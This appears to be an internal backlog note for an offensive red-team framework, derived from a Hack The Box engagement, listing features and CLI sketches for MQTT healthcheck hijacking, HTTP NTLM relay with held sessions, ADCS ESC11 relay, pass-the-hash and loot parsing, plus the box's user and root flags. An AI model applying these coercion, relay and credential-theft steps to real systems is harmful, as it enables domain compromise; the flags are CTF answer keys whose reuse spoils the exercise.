# ARK improvements — from Ghostlink eng (2026-08-05)

Full narrative: `PENTEST_REPORT.md`. This file is the **product backlog extract**.

## Context

Ghostlink’s kill chain is mostly **pre-implant**: MQTT coercion → HTTP NTLM relay → web LFI → KeePass → Gogs RCE → domain user → (ADCS or Admin PTH). ARK today shines after WinRM/implant; this eng barely used the C2 plane for the critical path.

## Sprint D status (implemented in-tree)

| ID | Status | Ship as |
|---|---|---|
| E-P0-1 | **Done** | `ark relay http start --listen IP:PORT` (ports ≥1024) |
| E-P0-2 | **Done** (v1 held session GET, not full browser SOCKS) | `ark relay http get --session N` |
| E-P0-3 | **Done** | `ark mqtt sub\|pub` |
| E-P0-4 | **Done** | `ark mqtt healthcheck-hijack` |
| E-P1-3 | **Done** | `docs/OPERATOR_PRE_IMPLANT.md` |
| E-P1-5 | **Partial** | Documented; implant SOCKS path noted |
| E-P1-1/2 ADCS | **Open** | Follow-up sprint |
| E-P2 browser SOCKS | **Open** | Follow-up |

Packages: `pkg/mqttcli`, `pkg/ntlmrelay`, `pkg/arkcli/mqtt.go`, `pkg/arkcli/relay.go`.

## Priority backlog

### P0 — Must have for Ghostlink-class boxes

| ID | Improvement | Why |
|---|---|---|
| E-P0-1 | **Operator HTTP NTLM listener** on configurable high ports | Rootless ops cannot bind 80/445; coerce still works on high HTTP ports |
| E-P0-2 | **HTTP→HTTP NTLM relay** with **held session** (GhostSurf-class SOCKS/proxy) | ntlmrelayx SOCKS is weak for IIS apps; LFI needs repeated authenticated GETs |
| E-P0-3 | **MQTT client** (sub/pub/retain, wildcards) | Entry point was 100% MQTT; paho retain/loop footguns burned time |
| E-P0-4 | **MQTT “set healthcheck URL” recipe** | One command: publish retained healthcheck JSON pointing at our listener |

### P1 — High value

| ID | Improvement | Why |
|---|---|---|
| E-P1-1 | **ADCS ESC8** (HTTP enrollment relay) | Intended domain path |
| E-P1-2 | **ADCS ESC11** (ICPR/RPC relay, template DomainController) | Official Ghostlink finish |
| E-P1-3 | **Unprivileged lab profile docs** | firewalld (Fedora), `ip_unprivileged_port_start`, default listeners >1024 |
| E-P1-4 | **Linux reverse-shell catch → implant upgrade** | After Gogs RCE, custom revshell UX was painful |
| E-P1-5 | **Document Linux implant SOCKS/portfwd** for internal CA/DC | Pivot existed only via chisel |

### P2 — Nice to have

| ID | Improvement | Why |
|---|---|---|
| E-P2-1 | Loot parsers: `NTUSER.DAT` RecentDocs, KeePass dump | Manual pykeepass/strings |
| E-P2-2 | Gogs fingerprint helper (version from static hash) | Not a full exploit framework |
| E-P2-3 | Operator clock-skew banner vs DC | ~8h skew on this box |
| E-P2-4 | Web LFI helper once relay session exists | `http get --session X --double-encode` |

## Concrete UX sketches

### MQTT

```text
mqtt sub --host 10.129.80.52 --topic '#' --seconds 20
mqtt pub --host 10.129.80.52 --retain \
  --topic GhostProtocolZero/systems/node/secureshare/healthcheck \
  --json '{"telemetry":{"url":"http://10.10.14.15:8888",...}}'
mqtt healthcheck-hijack --host ... --topic ... --url http://10.10.14.15:8888
```

### NTLM relay (operator)

```text
relay http start --listen 10.10.14.15:8888 \
  --target http://gpz-op26-secure.ghostlink.htb/ \
  --kernel-auth --keep --socks 1080
relay sessions
relay http get --session 1 --path /api/download/<double-encoded>
```

### ADCS

```text
adcs find --domain ghostlink.htb --dc 10.129.80.52 --user nvirelli --pass-file ...
adcs relay esc11 --ca ghostlink-GPZ-OP26-SECURE-CA --template DomainController \
  --target rpc://172.16.20.10 --socks 1082
# approval-gated:
adcs auth --pfx DC01.pfx --domain ghostlink.htb --user 'DC01$'
```

## Soft-compromise after foothold (already mostly works)

Prefer in-framework once creds exist:

- `lateral winrm` with password or PTH  
- `smb download` for flags  
- `ldap-enum`  
- `deploy_winrm.py` for Windows implant  

Do **not** default to LSASS on HTB soft path.

## External tools used (gap evidence)

| Tool | Role |
|---|---|
| GhostSurf | HTTP NTLM relay + SOCKS for IIS app |
| ntlmrelayx | ADCS attempt / backup relay |
| paho-mqtt | Topic dump + retain publish |
| chisel | Reverse SOCKS + CA port forwards |
| certipy / coercer | ADCS enum / coerce |
| Impacket secretsdump/SMB | DA + root flag |
| CVE-2025-8110 PoC | Gogs RCE |
| pykeepass | KeePass dump |

## Success metric for “Ghostlink in ARK”

An operator should complete the following **without leaving the ARK CLI** (except optional browser):

1. MQTT healthcheck hijack → listener  
2. Relay `svc_canary` → download LFI files  
3. Parse KeePass loot  
4. (Exploit Gogs may stay external) catch shell → Linux implant  
5. SOCKS to CA → ESC11 → Admin  
6. PTH / implant → flags  

## Flags (this eng)

| user | `d7061bf38c7455d54176097af52df692` |
| root | `33fc86179f59b9e200c2dae3b0979ba1` |
